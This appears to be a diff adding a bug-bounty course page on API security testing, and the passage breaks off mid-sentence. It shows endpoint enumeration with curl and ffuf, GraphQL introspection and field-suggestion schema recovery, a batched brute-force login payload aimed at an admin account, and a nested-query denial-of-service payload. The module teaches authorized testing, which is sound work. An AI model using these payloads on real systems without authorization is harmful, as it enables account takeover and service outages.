@@ -1,0 +1,1800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Access Control -->
+    <script src="../../../../components/AccessGuard.js"></script>
+    <script>AccessGuard.require('dark-arts');</script>
+    <!-- Progress & Achievements -->
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/ModuleProgress.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 08: API Security Testing - Bug Hunting</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { min-height: 100vh; background: #0a0508; font-family: 'Georgia', 'Times New Roman', serif; color: #8a6a9a; line-height: 1.7; overflow-x: hidden; }
+        body::before { content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: radial-gradient(ellipse at 15% 40%, rgba(80, 40, 100, 0.08) 0%, transparent 50%), radial-gradient(ellipse at 85% 60%, rgba(60, 20, 80, 0.06) 0%, transparent 50%); pointer-events: none; z-index: 0; }
+        .scroll-progress { position: fixed; top: 0; left: 0; height: 3px; background: linear-gradient(90deg, #9333ea, #a855f7); z-index: 200; transition: width 0.1s linear; width: 0%; }
+        .module-header { background: rgba(10, 5, 15, 0.95); border-bottom: 1px solid rgba(100, 60, 130, 0.2); padding: 18px 40px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(10px); }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .back-btn { background: rgba(80, 40, 100, 0.2); border: 1px solid rgba(100, 60, 130, 0.3); color: #9a7aaa; padding: 7px 14px; border-radius: 4px; font-size: 0.8rem; text-decoration: none; transition: all 0.3s ease; font-family: 'Georgia', serif; }
+        .back-btn:hover { background: rgba(100, 60, 130, 0.3); border-color: rgba(147, 51, 234, 0.5); color: #c4a0d8; }
+        .module-label { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.2em; text-transform: uppercase; }
+        .header-right { display: flex; align-items: center; gap: 12px; font-size: 0.75rem; color: #6a4a7a; }
+        .progress-bar-mini { width: 120px; height: 4px; background: rgba(60, 30, 80, 0.3); border-radius: 2px; overflow: hidden; }
+        .progress-bar-mini .fill { height: 100%; background: linear-gradient(90deg, #9333ea, #a855f7); width: 0%; transition: width 0.5s ease; }
+        .module-content { max-width: 1100px; margin: 0 auto; padding: 40px; position: relative; z-index: 10; }
+        .intro-section { text-align: center; padding: 50px 0 60px; }
+        .intro-icon { font-size: 3.5rem; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(147, 51, 234, 0.3)); }
+        .intro-title { font-size: 2.4rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; letter-spacing: 0.05em; }
+        .intro-meta { font-size: 0.75rem; color: #6a4a7a; letter-spacing: 0.25em; text-transform: uppercase; margin-bottom: 20px; }
+        .intro-subtitle { font-size: 1rem; color: #8a6a9a; max-width: 720px; margin: 0 auto; line-height: 1.8; }
+        .module-stats { display: flex; justify-content: center; gap: 25px; margin-top: 30px; flex-wrap: wrap; }
+        .stat-pill { padding: 8px 18px; background: rgba(60, 30, 80, 0.15); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 20px; font-size: 0.75rem; color: #7a5a8a; letter-spacing: 0.1em; }
+        .section { margin-bottom: 80px; opacity: 0; transform: translateY(30px); transition: opacity 0.6s ease, transform 0.6s ease; }
+        .section.visible { opacity: 1; transform: translateY(0); }
+        .section-number { font-size: 0.65rem; color: #6a4a7a; letter-spacing: 0.35em; text-transform: uppercase; margin-bottom: 8px; }
+        .section-title { font-size: 1.9rem; color: #c4a0d8; margin-bottom: 20px; font-weight: 400; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid rgba(100, 60, 130, 0.15); padding-bottom: 15px; }
+        .section-icon { font-size: 1.6rem; opacity: 0.75; }
+        .section-body { color: #a080b0; font-size: 0.97rem; }
+        .section-body p { margin-bottom: 16px; }
+        .section-body ul { list-style: none; padding-left: 20px; margin-bottom: 16px; }
+        .section-body li { margin-bottom: 10px; position: relative; padding-left: 20px; }
+        .section-body li::before { content: '\25B8'; position: absolute; left: 0; color: #7a5a8a; }
+        .section-body h3 { color: #c4a0d8; font-size: 1.05rem; font-weight: 400; margin: 28px 0 14px; }
+        .standards-table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 0.87rem; }
+        .standards-table th { background: rgba(40, 20, 60, 0.5); color: #c4a0d8; padding: 12px 16px; text-align: left; font-weight: normal; letter-spacing: 0.1em; font-size: 0.78rem; text-transform: uppercase; border-bottom: 1px solid rgba(100, 60, 130, 0.2); }
+        .standards-table td { padding: 12px 16px; color: #9a7aaa; border-bottom: 1px solid rgba(100, 60, 130, 0.08); vertical-align: top; }
+        .standards-table tr:hover td { background: rgba(40, 20, 60, 0.2); }
+        .standards-table .std-name { color: #c4a0d8; font-family: 'Courier New', monospace; font-size: 0.9rem; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; }
+        .badge-critical { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .badge-high { background: rgba(249, 115, 22, 0.2); color: #fb923c; border: 1px solid rgba(249, 115, 22, 0.3); }
+        .badge-medium { background: rgba(234, 179, 8, 0.15); color: #facc15; border: 1px solid rgba(234, 179, 8, 0.3); }
+        .badge-low { background: rgba(34, 197, 94, 0.15); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .badge-tool { background: rgba(147, 51, 234, 0.2); color: #c084fc; border: 1px solid rgba(147, 51, 234, 0.3); }
+        .concept-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 18px; margin: 28px 0; }
+        .concept-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; transition: all 0.3s ease; }
+        .concept-card:hover { transform: translateY(-4px); border-color: rgba(147, 51, 234, 0.35); box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3); }
+        .concept-card-icon { font-size: 1.8rem; margin-bottom: 12px; }
+        .concept-card-title { font-size: 1rem; color: #c4a0d8; margin-bottom: 8px; }
+        .concept-card-body { font-size: 0.85rem; color: #8a6a9a; line-height: 1.6; }
+        .concept-tag { display: inline-block; margin-top: 10px; padding: 3px 10px; background: rgba(80, 40, 100, 0.3); border-radius: 12px; font-size: 0.65rem; color: #9333ea; letter-spacing: 0.1em; text-transform: uppercase; }
+        .callout { border-radius: 8px; padding: 20px 24px; margin: 24px 0; display: flex; gap: 16px; align-items: flex-start; }
+        .callout-info { background: rgba(40, 20, 60, 0.4); border-left: 3px solid #9333ea; }
+        .callout-warning { background: rgba(60, 40, 10, 0.4); border-left: 3px solid #ca8a04; }
+        .callout-danger { background: rgba(60, 20, 20, 0.4); border-left: 3px solid #dc2626; }
+        .callout-tip { background: rgba(20, 50, 30, 0.4); border-left: 3px solid #16a34a; }
+        .callout-icon { font-size: 1.3rem; flex-shrink: 0; margin-top: 1px; }
+        .callout-title { font-size: 0.8rem; letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 6px; }
+        .callout-info .callout-title { color: #a855f7; }
+        .callout-warning .callout-title { color: #eab308; }
+        .callout-danger .callout-title { color: #ef4444; }
+        .callout-tip .callout-title { color: #22c55e; }
+        .callout-text { font-size: 0.9rem; color: #9a7aaa; line-height: 1.65; }
+        .detail-section { margin: 20px 0; }
+        .detail-toggle { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 6px; padding: 14px 18px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; color: #c4a0d8; font-size: 0.9rem; font-family: 'Georgia', serif; transition: all 0.3s ease; }
+        .detail-toggle:hover { border-color: rgba(147, 51, 234, 0.4); background: rgba(40, 20, 60, 0.3); }
+        .detail-toggle-arrow { transition: transform 0.3s ease; color: #9333ea; }
+        .detail-content { max-height: 0; overflow: hidden; transition: max-height 0.4s ease; }
+        .detail-content.open { max-height: 2000px; }
+        .detail-inner { padding: 18px; background: rgba(10, 5, 15, 0.5); border: 1px solid rgba(100, 60, 130, 0.1); border-top: none; border-radius: 0 0 6px 6px; }
+        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 16px; margin: 20px 0; }
+        .tool-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 20px; transition: all 0.3s ease; }
+        .tool-card:hover { border-color: rgba(147, 51, 234, 0.3); }
+        .tool-name { font-size: 0.95rem; color: #c4a0d8; margin-bottom: 4px; font-family: 'Courier New', monospace; }
+        .tool-role { font-size: 0.68rem; color: #9333ea; letter-spacing: 0.12em; text-transform: uppercase; margin-bottom: 10px; }
+        .tool-desc { font-size: 0.84rem; color: #8a6a9a; line-height: 1.6; }
+        .code-block { background: rgba(5, 2, 10, 0.8); border: 1px solid rgba(100, 60, 130, 0.2); border-radius: 6px; padding: 16px 20px; margin: 16px 0; font-family: 'Courier New', monospace; font-size: 0.84rem; color: #b090c0; overflow-x: auto; line-height: 1.6; white-space: pre-wrap; }
+        .code-block .kw { color: #a855f7; }
+        .code-block .str { color: #86efac; }
+        .code-block .comment { color: #6a4a7a; font-style: italic; }
+        .code-block .flag { color: #fbbf24; }
+        .code-block .cmd { color: #60a5fa; }
+        .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
+        .col-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 22px; }
+        .col-card h3 { font-size: 1rem; color: #c4a0d8; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .col-card ul { list-style: none; padding: 0; }
+        .col-card li { font-size: 0.88rem; color: #8a6a9a; padding: 6px 0; border-bottom: 1px solid rgba(100, 60, 130, 0.08); display: flex; align-items: flex-start; gap: 8px; }
+        .col-card li:last-child { border-bottom: none; }
+        .li-marker { color: #9333ea; flex-shrink: 0; }
+        .numbered-list { list-style: none; padding-left: 0; margin-bottom: 16px; counter-reset: step-counter; }
+        .numbered-list li { counter-increment: step-counter; position: relative; padding-left: 40px; margin-bottom: 14px; }
+        .numbered-list li::before { content: counter(step-counter, decimal-leading-zero); position: absolute; left: 0; color: #9333ea; font-family: 'Courier New', monospace; font-size: 0.85rem; font-weight: bold; }
+        .discussion-section { background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.25); border-radius: 10px; padding: 30px; margin: 40px 0; }
+        .discussion-title { font-size: 1.1rem; color: #c4a0d8; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
+        .prompt-list { list-style: none; padding: 0; }
+        .prompt-item { padding: 14px 18px; background: rgba(15, 8, 20, 0.5); border: 1px solid rgba(100, 60, 130, 0.12); border-radius: 6px; margin-bottom: 10px; font-size: 0.9rem; color: #9a7aaa; line-height: 1.6; display: flex; gap: 12px; }
+        .prompt-num { color: #9333ea; font-size: 0.8rem; font-family: 'Courier New', monospace; flex-shrink: 0; padding-top: 2px; }
+        .takeaway-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin: 24px 0; }
+        .takeaway-card { background: rgba(15, 8, 20, 0.6); border: 1px solid rgba(100, 60, 130, 0.15); border-radius: 8px; padding: 20px; text-align: center; }
+        .takeaway-icon { font-size: 2rem; margin-bottom: 10px; }
+        .takeaway-title { font-size: 0.85rem; color: #c4a0d8; margin-bottom: 6px; }
+        .takeaway-desc { font-size: 0.78rem; color: #7a5a8a; line-height: 1.5; }
+        .completion-section { text-align: center; padding: 60px 40px; background: linear-gradient(135deg, rgba(40, 20, 60, 0.3), rgba(30, 15, 50, 0.4)); border: 1px solid rgba(100, 60, 130, 0.3); border-radius: 12px; margin: 60px 0 40px; }
+        .completion-icon { font-size: 3.5rem; margin-bottom: 20px; }
+        .completion-title { font-size: 1.8rem; color: #c4a0d8; margin-bottom: 12px; font-weight: 400; }
+        .completion-text { color: #8a6a9a; font-size: 0.95rem; max-width: 560px; margin: 0 auto 30px; line-height: 1.8; }
+        .completion-btn { display: inline-flex; align-items: center; gap: 10px; padding: 14px 36px; background: linear-gradient(135deg, #7c3aed, #9333ea); border: none; border-radius: 8px; color: #f3e8ff; font-size: 1rem; cursor: pointer; font-family: 'Georgia', serif; letter-spacing: 0.05em; transition: all 0.3s ease; box-shadow: 0 4px 20px rgba(147, 51, 234, 0.3); }
+        .completion-btn:hover { background: linear-gradient(135deg, #6d28d9, #7c3aed); box-shadow: 0 6px 30px rgba(147, 51, 234, 0.45); transform: translateY(-2px); }
+        @media (max-width: 768px) { .module-header { padding: 15px 20px; } .module-content { padding: 20px; } .two-col { grid-template-columns: 1fr; } .concept-grid { grid-template-columns: 1fr; } .tool-grid { grid-template-columns: 1fr; } .intro-title { font-size: 1.8rem; } .section-title { font-size: 1.5rem; } }
+    </style>
+</head>
+<body>
+
+<div class="scroll-progress" id="scrollProgress"></div>
+
+<header class="module-header">
+    <div class="header-left">
+        <a href="../index.html" class="back-btn">&#8592; Back to Course</a>
+        <div>
+            <div class="module-label">BH // Bug Hunting &middot; Module 08</div>
+        </div>
+    </div>
+    <div class="header-right">
+        <span>Reading Progress</span>
+        <div class="progress-bar-mini">
+            <div class="fill" id="readingFill"></div>
+        </div>
+    </div>
+</header>
+
+<main class="module-content">
+
+    <!-- Hero -->
+    <div class="intro-section">
+        <div class="intro-icon">&#128268;</div>
+        <h1 class="intro-title">API Security Testing</h1>
+        <div class="intro-meta">Bug Hunting &bull; Module 08 &bull; API Security</div>
+        <p class="intro-subtitle">
+            APIs are the backbone of modern web and mobile applications. Every single-page application,
+            mobile app, and microservice architecture communicates through APIs &mdash; REST, GraphQL,
+            gRPC, WebSocket. As frontends have become thinner, the API layer has absorbed the majority
+            of business logic and data access. This makes APIs the highest-value attack surface in most
+            bug bounty programs. This module covers systematic enumeration of API endpoints, protocol-specific
+            attack techniques, authorization bypass patterns unique to APIs, and the methodology for
+            turning API misconfigurations into high-severity bounty reports.
+        </p>
+        <div class="module-stats">
+            <div class="stat-pill">REST &amp; GraphQL</div>
+            <div class="stat-pill">OWASP API Top 10</div>
+            <div class="stat-pill">Authorization Bypass</div>
+            <div class="stat-pill">Rate Limiting</div>
+            <div class="stat-pill">~30 min read</div>
+        </div>
+    </div>
+
+    <!-- Section 1: REST API Enumeration -->
+    <div class="section" id="s1">
+        <div class="section-number">Section 01</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#128269;</span>
+            REST API Enumeration
+        </h2>
+        <div class="section-body">
+            <p>
+                Before you can test an API for vulnerabilities, you need to know it exists. API enumeration
+                is the process of discovering endpoints, methods, parameters, and versioning schemes that the
+                application exposes. Many APIs are partially or fully undocumented &mdash; the frontend may
+                only use a fraction of the available endpoints, leaving administrative, internal, and deprecated
+                routes accessible to anyone who knows the path.
+            </p>
+
+            <h3>HTTP Methods and Their Implications</h3>
+
+            <p>
+                Every REST endpoint should be tested with all standard HTTP methods. Developers frequently
+                implement GET handlers but forget to restrict PUT, DELETE, or PATCH on the same route. A
+                read-only endpoint that also accepts DELETE requests is a critical finding.
+            </p>
+
+            <table class="standards-table">
+                <thead>
+                    <tr>
+                        <th>Method</th>
+                        <th>Standard Use</th>
+                        <th>Security Implication</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td class="std-name">GET</td>
+                        <td>Retrieve a resource. Should be idempotent and safe (no side effects).</td>
+                        <td>Data exposure if authorization is missing. Parameters visible in URL, logs, and Referer headers.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">POST</td>
+                        <td>Create a resource or submit data for processing.</td>
+                        <td>Mass assignment if the server binds request body directly to models without filtering fields.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">PUT</td>
+                        <td>Replace an entire resource at the given URI.</td>
+                        <td>Often less protected than POST. Can overwrite fields the frontend never exposes (role, permissions).</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">PATCH</td>
+                        <td>Partially update a resource.</td>
+                        <td>Selective field modification &mdash; test adding fields not present in the original request (admin, verified).</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">DELETE</td>
+                        <td>Remove a resource.</td>
+                        <td>Destructive action. Often lacks authorization checks on individual resources (BOLA via DELETE).</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">OPTIONS</td>
+                        <td>Returns allowed methods and CORS headers for a resource.</td>
+                        <td>Reveals supported methods, CORS policy, and custom headers. Always send OPTIONS first during enumeration.</td>
+                    </tr>
+                    <tr>
+                        <td class="std-name">HEAD</td>
+                        <td>Identical to GET but returns only headers, no body.</td>
+                        <td>Can bypass content-length-based WAF rules. Useful for confirming endpoint existence without triggering alerts.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>Endpoint Discovery Patterns</h3>
+
+            <p>
+                API endpoints follow predictable naming conventions. Once you identify the base path and
+                versioning scheme, you can enumerate systematically. The most common patterns are:
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Common API base paths to check</span>
+/api/
+/api/v1/
+/api/v2/
+/api/v3/
+/api/internal/
+/api/private/
+/api/admin/
+/api/debug/
+/graphql
+/graphql/console
+/gql
+/v1/
+/v2/
+/rest/
+/service/
+/services/
+/rpc/
+
+<span class="comment"># Common resource endpoints under any base path</span>
+/users
+/users/me
+/users/profile
+/accounts
+/admin
+/admin/users
+/admin/settings
+/admin/config
+/settings
+/config
+/health
+/status
+/metrics
+/info
+/debug
+/docs
+/swagger
+/swagger.json
+/swagger.yaml
+/openapi.json
+/openapi.yaml
+/api-docs
+/redoc
+/graphql/schema
+/actuator          <span class="comment"># Spring Boot actuator endpoints</span>
+/actuator/env
+/actuator/health
+/actuator/mappings
+/env
+/trace
+/dump
+</div>
+
+            <h3>Swagger and OpenAPI Specification Hunting</h3>
+
+            <p>
+                Many organizations deploy API documentation alongside their APIs and fail to restrict
+                access. Swagger UI and OpenAPI specification files describe every endpoint, parameter,
+                request body schema, authentication requirement, and response format &mdash; a complete
+                blueprint for testing. Finding an exposed spec file eliminates the need for blind enumeration.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Swagger/OpenAPI discovery paths</span>
+$ <span class="kw">curl</span> <span class="flag">-s</span> <span class="flag">-o</span> /dev/null <span class="flag">-w</span> <span class="str">"%{http_code}"</span> https://target.com/swagger.json
+$ <span class="kw">curl</span> <span class="flag">-s</span> <span class="flag">-o</span> /dev/null <span class="flag">-w</span> <span class="str">"%{http_code}"</span> https://target.com/swagger/v1/swagger.json
+$ <span class="kw">curl</span> <span class="flag">-s</span> <span class="flag">-o</span> /dev/null <span class="flag">-w</span> <span class="str">"%{http_code}"</span> https://target.com/api-docs
+$ <span class="kw">curl</span> <span class="flag">-s</span> <span class="flag">-o</span> /dev/null <span class="flag">-w</span> <span class="str">"%{http_code}"</span> https://target.com/openapi.json
+$ <span class="kw">curl</span> <span class="flag">-s</span> <span class="flag">-o</span> /dev/null <span class="flag">-w</span> <span class="str">"%{http_code}"</span> https://target.com/v2/api-docs
+$ <span class="kw">curl</span> <span class="flag">-s</span> <span class="flag">-o</span> /dev/null <span class="flag">-w</span> <span class="str">"%{http_code}"</span> https://target.com/api/swagger-ui.html
+$ <span class="kw">curl</span> <span class="flag">-s</span> <span class="flag">-o</span> /dev/null <span class="flag">-w</span> <span class="str">"%{http_code}"</span> https://target.com/.well-known/openapi.json
+
+<span class="comment"># Fuzz for API documentation with ffuf</span>
+$ <span class="kw">ffuf</span> <span class="flag">-u</span> <span class="str">https://target.com/FUZZ</span> \
+     <span class="flag">-w</span> <span class="str">/usr/share/seclists/Discovery/Web-Content/swagger.txt</span> \
+     <span class="flag">-mc</span> <span class="str">200,301,302</span>
+</div>
+
+            <h3>API Versioning Exploitation</h3>
+
+            <p>
+                When an API migrates from v1 to v2, the older version is frequently left running. Deprecated
+                versions often lack the security patches, rate limiting, and authorization improvements applied
+                to the current version. If the current API is at <code style="color: #c084fc;">/api/v3/</code>,
+                always test <code style="color: #c084fc;">/api/v2/</code> and
+                <code style="color: #c084fc;">/api/v1/</code> for the same endpoints. Common findings include:
+            </p>
+
+            <ul>
+                <li><strong style="color: #c4a0d8;">Missing authentication</strong> &mdash; v1 may not require tokens that v2 enforces</li>
+                <li><strong style="color: #c4a0d8;">Relaxed authorization</strong> &mdash; RBAC checks added in v2 may be absent from v1 endpoints</li>
+                <li><strong style="color: #c4a0d8;">Verbose responses</strong> &mdash; v1 may return full user objects while v2 filters sensitive fields</li>
+                <li><strong style="color: #c4a0d8;">Missing rate limiting</strong> &mdash; Rate limits applied to v2 may not cover v1</li>
+                <li><strong style="color: #c4a0d8;">Deprecated functionality</strong> &mdash; Admin endpoints removed from v2 documentation but still functional on v1</li>
+            </ul>
+
+            <div class="code-block">
+<span class="comment"># Version comparison testing</span>
+
+<span class="comment"># Current version (v3) requires auth and returns filtered data</span>
+$ <span class="kw">curl</span> <span class="flag">-s</span> https://target.com/api/v3/users/me
+{<span class="str">"error"</span>: <span class="str">"unauthorized"</span>}
+
+<span class="comment"># Deprecated version (v1) may skip auth entirely</span>
+$ <span class="kw">curl</span> <span class="flag">-s</span> https://target.com/api/v1/users/me
+{<span class="str">"id"</span>: 1, <span class="str">"email"</span>: <span class="str">"admin@target.com"</span>, <span class="str">"role"</span>: <span class="str">"admin"</span>, <span class="str">"password_hash"</span>: <span class="str">"$2b$..."</span>}
+
+<span class="comment"># Check for undocumented internal API paths</span>
+$ <span class="kw">curl</span> <span class="flag">-s</span> https://target.com/api/internal/users
+$ <span class="kw">curl</span> <span class="flag">-s</span> https://target.com/api/private/config
+$ <span class="kw">curl</span> <span class="flag">-s</span> https://target.com/api/debug/routes
+</div>
+
+            <div class="callout callout-info">
+                <span class="callout-icon">&#8505;</span>
+                <div class="callout-content">
+                    <div class="callout-title">JavaScript Source Mining</div>
+                    <div class="callout-text">
+                        The richest source of undocumented API endpoints is the application's own JavaScript.
+                        Modern SPAs bundle every API call into their JavaScript files. Download the main bundle,
+                        beautify it, and search for patterns like <code style="color: #c084fc;">fetch(</code>,
+                        <code style="color: #c084fc;">axios.</code>,
+                        <code style="color: #c084fc;">XMLHttpRequest</code>,
+                        <code style="color: #c084fc;">/api/</code>, and
+                        <code style="color: #c084fc;">baseURL</code>. Tools like LinkFinder and JSParser
+                        automate this process, extracting all URLs and API paths from JavaScript files.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Section 2: GraphQL Security -->
+    <div class="section" id="s2">
+        <div class="section-number">Section 02</div>
+        <h2 class="section-title">
+            <span class="section-icon">&#9670;</span>
+            GraphQL Security
+        </h2>
+        <div class="section-body">
+            <p>
+                GraphQL is a query language for APIs that allows clients to request exactly the data they
+                need. Unlike REST, where each endpoint returns a fixed data structure, GraphQL exposes a
+                single endpoint that accepts structured queries. This flexibility introduces a unique set
+                of security challenges: introspection leaks the entire schema, deeply nested queries can
+                cause denial of service, and authorization must be enforced at the resolver level rather
+                than the route level.
+            </p>
+
+            <h3>Introspection Queries</h3>
+
+            <p>
+                GraphQL introspection is a built-in feature that allows anyone to query the schema and
+                discover every type, field, argument, and relationship in the API. While useful during
+                development, leaving introspection enabled in production is equivalent to publishing your
+                entire API documentation. Many production GraphQL APIs still have introspection enabled.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Full introspection query &mdash; retrieves the entire schema</span>
+{
+  <span class="kw">__schema</span> {
+    <span class="str">queryType</span> { name }
+    <span class="str">mutationType</span> { name }
+    <span class="str">types</span> {
+      name
+      kind
+      description
+      fields {
+        name
+        description
+        type {
+          name
+          kind
+          ofType { name kind }
+        }
+        args {
+          name
+          type { name kind }
+          defaultValue
+        }
+      }
+    }
+  }
+}
+
+<span class="comment"># Send via curl</span>
+$ <span class="kw">curl</span> <span class="flag">-X</span> POST https://target.com/graphql \
+     <span class="flag">-H</span> <span class="str">"Content-Type: application/json"</span> \
+     <span class="flag">-d</span> <span class="str">'{"query": "{ __schema { types { name fields { name type { name } } } } }"}'</span>
+
+<span class="comment"># Minimal introspection probe (confirm if enabled)</span>
+$ <span class="kw">curl</span> <span class="flag">-X</span> POST https://target.com/graphql \
+     <span class="flag">-H</span> <span class="str">"Content-Type: application/json"</span> \
+     <span class="flag">-d</span> <span class="str">'{"query": "{ __typename }"}'</span>
+</div>
+
+            <h3>Field Suggestion Exploitation</h3>
+
+            <p>
+                Even when introspection is disabled, many GraphQL implementations offer field suggestions
+                in error messages. If you query a non-existent field, the server responds with "Did you
+                mean X, Y, or Z?" &mdash; effectively leaking field names. By systematically sending
+                queries with plausible field name prefixes, you can reconstruct the schema without
+                introspection.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Field suggestion exploitation</span>
+<span class="comment"># Query a field that does not exist but is close to a real one</span>
+$ <span class="kw">curl</span> <span class="flag">-X</span> POST https://target.com/graphql \
+     <span class="flag">-H</span> <span class="str">"Content-Type: application/json"</span> \
+     <span class="flag">-d</span> <span class="str">'{"query": "{ usr { id } }"}'</span>
+
+<span class="comment"># Response may reveal real field names:</span>
+<span class="comment"># "Cannot query field \"usr\". Did you mean \"user\" or \"users\"?"</span>
+
+<span class="comment"># Iterate with common prefixes</span>
+<span class="comment"># adm  -> "Did you mean admin, adminUser, adminSettings?"</span>
+<span class="comment"># pass -> "Did you mean password, passwordReset?"</span>
+<span class="comment"># sec  -> "Did you mean secret, securityLog?"</span>
+
+<span class="comment"># Tool: clairvoyance — automated schema recovery via suggestions</span>
+$ <span class="kw">python3</span> clairvoyance.py <span class="flag">-u</span> <span class="str">https://target.com/graphql</span> <span class="flag">-o</span> schema.json
+</div>
+
+            <h3>Batching Attacks</h3>
+
+            <p>
+                GraphQL supports query batching &mdash; sending multiple operations in a single HTTP request.
+                This is commonly exploited for brute-force attacks: instead of sending 1,000 login requests
+                that trigger rate limiting, an attacker sends a single request containing 1,000 aliased
+                login mutations. Most rate limiters count HTTP requests, not GraphQL operations within a
+                request.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Batched brute-force: 5 login attempts in a single HTTP request</span>
+{
+  <span class="kw">a1</span>: login(email: <span class="str">"admin@target.com"</span>, password: <span class="str">"password1"</span>) { token }
+  <span class="kw">a2</span>: login(email: <span class="str">"admin@target.com"</span>, password: <span class="str">"password2"</span>) { token }
+  <span class="kw">a3</span>: login(email: <span class="str">"admin@target.com"</span>, password: <span class="str">"password3"</span>) { token }
+  <span class="kw">a4</span>: login(email: <span class="str">"admin@target.com"</span>, password: <span class="str">"password4"</span>) { token }
+  <span class="kw">a5</span>: login(email: <span class="str">"admin@target.com"</span>, password: <span class="str">"admin"</span>) { token }
+}
+
+<span class="comment"># Array-based batching (alternative format)</span>
+[
+  {<span class="str">"query"</span>: <span class="str">"mutation { login(email: \"admin@target.com\", password: \"pass1\") { token } }"</span>},
+  {<span class="str">"query"</span>: <span class="str">"mutation { login(email: \"admin@target.com\", password: \"pass2\") { token } }"</span>},
+  {<span class="str">"query"</span>: <span class="str">"mutation { login(email: \"admin@target.com\", password: \"pass3\") { token } }"</span>}
+]
+</div>
+
+            <h3>Nested Query Denial of Service</h3>
+
+            <p>
+                GraphQL's recursive type system allows deeply nested queries. If the schema includes
+                circular relationships (a User has Posts, each Post has an Author who is a User, who has
+                Posts...), an attacker can construct a query that nests dozens of levels deep, causing
+                exponential resource consumption on the server. Without query depth limiting or query
+                cost analysis, a single request can exhaust server memory or CPU.
+            </p>
+
+            <div class="code-block">
+<span class="comment"># Nested query DoS &mdash; exponential resource consumption</span>
+<span class="comment"># Each level multiplies the data the server must resolve</span>
+{
+  <span class="kw">users</span> {
+    posts {
+      author {
+        posts {
+          author {
+            posts {
+              author {
+                posts {
+                  title
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+<span class="comment"># If each user has 10 posts, depth 8 = 10^8 = 100 million resolve operations</span>
+</div>
+
+            <h3>Authorization Bypass in Resolvers</h3>
+
+            <p>
+                In REST APIs, authorization is typically enforced at the route or middleware level. In
+                GraphQL, authorization must be enforced in each individual resolver function. Developers
+                frequently protect the top-level query but fail to authorize nested field resolvers. A
+                user may be authorized to query their own profile, but the profile's
+                <code style="color: #c084fc;">organization</code> field resolver may return all
+                organization members without checking if the requesting user has permission to view them.
+            </p>
+
+            <div class="tool-grid">
+                <div class="tool-card">
+                    <div class="tool-name">GraphQL Voyager</div>
+                    <div class="tool-role">Schema Visualization</div>
+                    <div class="tool-desc">
+                        Interactive graph visualization of a GraphQL schema. Renders types, fields, and
+                        relationships as a navigable diagram. Feed it an introspection result to map the
+                        entire API structure visually before testing.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">InQL</div>
+                    <div class="tool-role">Burp Suite Extension</div>
+                    <div class="tool-desc">
+                        Burp Suite extension for GraphQL testing. Parses introspection responses, generates
+                        queries for every type and mutation, detects batch query support, and identifies
+                        query complexity issues. Essential for systematic GraphQL security assessment.
+                    </div>
+                </div>
+                <div class="tool-card">
+                    <div class="tool-name">Clairvoyance</div>
+                    <div class="tool-role">Python &middot; Schema Recovery</div>
+                    <div class="tool-desc">
+                        Recovers GraphQL schemas when introspection is disabled by exploiting field
+                        suggestion error messages. Iteratively probes for type names, field names, and
+                        argument structures to reconstruct the full schema.
+                    </div>
+                </div>
+            </div>
+
+            <div class="callout callout-warning">
+                <span class="callout-icon">&#9888;</span>
+                <div class="callout-content">
+                    <div class="callout-title">Mutation Abuse</div>
+                    <div class="callout-text">
+                        GraphQL mutations modify server state. Once you discover mutations via introspection
+                        or field suggestions, test each one for authorization: can a regular user invoke
